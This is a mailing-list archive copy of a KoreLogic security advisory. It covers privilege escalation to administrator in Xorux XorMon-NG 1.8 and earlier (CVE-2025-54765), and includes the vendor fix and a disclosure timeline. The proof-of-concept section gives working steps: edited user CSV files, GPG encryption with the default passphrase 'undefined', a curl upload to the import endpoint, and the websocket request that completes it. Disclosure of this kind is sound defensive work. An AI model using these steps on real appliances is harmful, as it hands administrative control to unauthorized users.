---
title: KL-001-2025-013: Xorux XorMon-NG Web Application Privilege Escalation to Administrator
url: https://seclists.org/fulldisclosure/2025/Jul/16
source: Full Disclosure
date: 2025-07-29
fetch_date: 2025-10-07T00:09:47.391669
---

# KL-001-2025-013: Xorux XorMon-NG Web Application Privilege Escalation to Administrator

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](15)
[By Date](date.html#16)
[![Next](/images/right-icon-16x16.png)](17)

[![Previous](/images/left-icon-16x16.png)](15)
[By Thread](index.html#16)
[![Next](/images/right-icon-16x16.png)](17)

![](/shared/images/nst-icons.svg#search)

# KL-001-2025-013: Xorux XorMon-NG Web Application Privilege Escalation to Administrator

---

*From*: KoreLogic Disclosures via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Mon, 28 Jul 2025 18:39:36 -0500

---

```
KL-001-2025-013: Xorux XorMon-NG Web Application Privilege Escalation to Administrator

Title: Xorux XorMon-NG Web Application Privilege Escalation to Administrator
Advisory ID: KL-001-2025-013
Publication Date: 2025-07-28
Publication URL: https://korelogic.com/Resources/Advisories/KL-001-2025-013.txt

1. Vulnerability Details

     Affected Vendor: Xorux
     Affected Product: XorMon-NG
     Affected Version: 1.8 and prior
     Platform: Debian
     CWE Classification: CWE-648: Incorrect Use of Privileged APIs
     CVE ID: CVE-2025-54765

2. Vulnerability Description

     An API endpoint that should be limited to web application
     administrators is hidden from, but accessible by, lower-level
     read only web application users. The endpoint can be used to
     import the appliance configuration, allowing an attacker to
     control the configuration of the appliance, to include granting
     themselves administrative level permissions.

3. Technical Description

     A read-only user can access a web application endpoint by
     which device imports can be uploaded. The device exports
     are in tar.gz.gpg format, and can be constructed to include
     arbitrary device configuration information of an attacker's
     choosing. In the case of privilege escalation, an attacker
     can export the device configuration, modify the readonly
     account to have administrative privileges, and then re-import
     the configuration into the appliance. The GPG encryption
     uses a default of "undefined" for symmetric encryption and
     decryption. An authenticated, read-only attacker could leverage
     this vulnerability to obtain administrative level permissions
     within the web application.

4. Mitigation and Remediation Recommendation

     Xorux released version 1.9.38, which includes a remediation
     for this vulnerability. See https://xormon.com/note190.php.

5. Credit

     This vulnerability was discovered by Jim Becher of KoreLogic,
     Inc.

6. Disclosure Timeline

     2025-07-17 : KoreLogic requests point-of-contact to securely
                  report several vulnerabilities to Xorux.
     2025-07-18 : Vendor provides support () xorux com as the
                  point-of-contact, noting that they do not use PGP.
     2025-07-21 : KoreLogic submits this vulnerability and four
                  additional discoveries to Xorux.
     2025-07-23 : Vendor acknowledges receipt, stating that the issue
                  has been remediated and a new version of the
                  affected product will be available 2025-07-25.
     2025-07-25 : Xorux publishes updated version of the affected
                  product.
     2025-07-28 : KoreLogic public disclosure.

7. Proof of Concept

     Use the steps documented in KL-001-2025-012, which allows for
     export the Xormon NG device configuration.

     Edit the confporter/users_groups.csv file to include an
     additional line, indicating that the read only account be a
     member of the Admin group (typically/always group "1"). The
     user_id will depend on the user_id of the readonly account an
     attacker wants to use for privilege escalation. In the case
     of the research being performed, it was user_id "2", so the
     modified users_groups.csv file is shown below:

         $ more users_groups.csv
         user_id;group_id
         1;1;
         2;1;
         3;1;

     Additionally, a boolean value must be changed in the
     confporter/users.csv to indicate that the attacker's account
     is no longer a read only account. The 8th field, identified as
     "readonly" should be changed from "true" to "false", as shown
     below for the "jbecher" account.

         $ more users.csv
user_id;username;email;password;active;locked;failed_login_attempts;readonly;ldap_id;timezone;created;updated;logged;configuration
1;xormon;;$2b$10$GTliGfYOL7cUmvLpd6qTB.6x8UNTymyHrvLTncLoBmM/7Y5p4WsXi;true;false;0;false;;Etc/UTC;2025-06-09T20:27:52.040Z;2025-06-09T20:28:28.077Z;2025-06-09T20:28:28.051Z;{"showReleaseNotes":true,"searchHistoryLimit":40};
3;adman;adman () adman
com;$2a$10$MvdgLQO60xPZyRIU/rXCeucdZsy4LMyGXCW36IIbrWTmBXNFb5urW;true;false;0;false;;UTC;2025-06-09T20:29:11.811Z;2025-06-09T20:29:11.811Z;;{"searchHistoryLimit":40};
2;jbecher;jbecher () korelogic
com;$2a$10$gfngoltRPRvd0epLQ7YHVOrBDp1MuSvVlxMoOivIC1HwHsXRN1VVK;true;false;0;false;;UTC;2025-06-09T20:28:55.801Z;2025-06-09T20:29:31.962Z;2025-06-09T20:29:31.959Z;{"searchHistoryLimit":40};

     The confporter/* files will need to be tar'd and gzip'd back
     up, and then gpg symmetrically encrypted with the passphrase
     of "undefined". Once the GPG file is constructed, it can be
     imported by a readonly user as follows.

         $ curl -k -X POST -H "Cookie:
connect.sid=s%3AWvQYNjQMd9mYNlUYkIcJOI9yVbkCQ4sN.n%2Bo%2FxPB7%2B1tnK9opKrPf8QHhN%2Feh%2BWVKJ5AwIK9tn%2Fo"
         https://172.31.255.208/api/confporter/v1/import -F
         file=@configuration-new3.tar.gz.gpg {"message":"File
         uploaded","status":200}[S]

     An additional step of providing the GPG passphrase is performed
     as follows, from within Burp Repeater. Some fields have been
     snipped for brevity.

         GET /websocket/confimport?password=undefined HTTP/1.1
         Host: 172.31.255.208
         Accept: */*
         Accept-Language: en-US,en;q=0.5
         Accept-Encoding: gzip, deflate, br
         Origin: https://172.31.255.208
         Connection: keep-alive, Upgrade
         Cookie:
connect.sid=s%3AWvQYNjQMd9mYNlUYkIcJOI9yVbkCQ4sN.n%2Bo%2FxPB7%2B1tnK9opKrPf8QHhN%2Feh%2BWVKJ5AwIK9tn%2Fo
         Sec-Fetch-Dest: empty
         Sec-Fetch-Mode: websocket
         Sec-Fetch-Site: same-origin
         Pragma: no-cache
         Cache-Control: no-cache
         Upgrade: websocket

         HTTP/1.1 101 Switching Protocols
         Upgrade: websocket
         Connection: Upgrade

     The readonly user can now establish a new session with the
     web application and will have administrative level permissions.

The contents of this advisory are copyright(c) 2025
KoreLogic, Inc. and are licensed under a Creative Commons
Attribution Share-Alike 4.0 (United States) License:
http://creativecommons.org/licenses/by-sa/4.0/

KoreLogic, Inc. is a founder-owned and operated company with a
proven track record of providing security services to entities
ranging from Fortune 500 to small and mid-sized companies. We
are a highly skilled team of senior security consultants doing
by-hand security assessments for the most important networks in
the U.S. and around the world. We are also developers of various
tools and resources aimed at helping the security community.
https://www.korelogic.com/about-korelogic.html

Our public vulnerability disclosure policy is available at:
https://korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy
```

**Attachment:
[OpenPGP\_signature.asc](att-16/OpenPGP_signature_asc.bin)**
*Description:* OpenPGP digital signature

```
____________...